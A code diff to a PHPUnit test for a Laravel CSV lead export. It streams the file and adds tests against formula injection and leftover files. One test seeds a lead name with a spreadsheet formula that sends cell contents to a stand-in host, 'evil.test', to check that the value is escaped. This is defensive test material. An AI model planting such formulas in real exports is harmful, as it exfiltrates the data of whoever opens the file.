@@ -5,6 +5,7 @@ declare(strict_types=1);
 namespace Tests\Feature\Controllers\Lead;
 
 use App\Models\Lead;
+use App\Services\CsvExportService;
 use Illuminate\Support\Facades\Storage;
 use PHPUnit\Framework\Attributes\Test;
 use Tests\TestCase;
@@ -18,34 +19,49 @@ class LeadExportControllerTest extends TestCase
             ->count(2)
             ->create(['company_id' => $this->user->company_id]);
 
-        Storage::fake('local');
+        $response = $this->get('/lead/export');
 
-        $this->get('/lead/export');
-
-        $fileName = 'leads_'.$this->user->company->name.'_'.date('Ymd_His').'.csv';
-        Storage::disk('local')->assertExists($fileName);
-
-        $data = Storage::disk('local')->get($fileName);
+        $response->assertOk();
+        $this->assertStringStartsWith('text/csv', $response->headers->get('Content-type'));
+        $this->assertStringContainsString('attachment', $response->headers->get('Content-Disposition'));
 
         $columns = array_merge(['id'], (new Lead)->getFillable(), ['created_at', 'updated_at']);
-        $rowHeaders = implode(';', $columns);
-        $leads = Lead::all()->toArray();
-        $content = $rowHeaders."\n";
-        foreach ($leads as $row) {
-            $line = [];
+        $rows = array_map(function (array $row): array {
             $row['tags'] = is_array($row['tags']) ? implode(separator: ',', array: $row['tags']) : '';
             $row['notes'] = is_null($row['notes']) ? null : str_replace(["\r", "\n"], '-', $row['notes']);
             $row['country_id'] = $row['country']['id'];
             $row['seller_id'] = $row['seller']['id'];
             $row['industry_id'] = $row['industry']['id'];
             $row['company_id'] = $row['company']['id'];
-            foreach ($columns as $column) {
-                $line[] = $row[$column] ?? '';
-            }
-            $line = implode(';', $line);
-            $content = $content.$line."\n";
-        }
 
-        $this->assertEquals($data, $content);
+            return $row;
+        }, Lead::all()->toArray());
+
+        $this->assertEquals((new CsvExportService)->build($columns, $rows), $response->streamedContent());
+    }
+
+    #[Test]
+    public function it_neutralizes_formula_injection_in_exported_values(): void
+    {
+        Lead::factory()->create([
+            'company_id' => $this->user->company_id,
+            'name' => '=HYPERLINK("http://evil.test/?d="&A2)',
+        ]);
+
+        $content = $this->get('/lead/export')->streamedContent();
+
+        $this->assertStringContainsString('"\'=HYPERLINK(""http://evil.test/?d=""&A2)"', $content);
+        $this->assertStringNotContainsString(';=HYPERLINK', $content);
+    }
+
+    #[Test]
+    public function it_does_not_leave_export_files_on_disk(): void
+    {
+        Storage::fake('local');
+        Lead::factory()->create(['company_id' => $this->user->company_id]);
+
+        $this->get('/lead/export')->streamedContent();
+
+        $this->assertEmpty(Storage::disk('local')->allFiles());
     }
 }
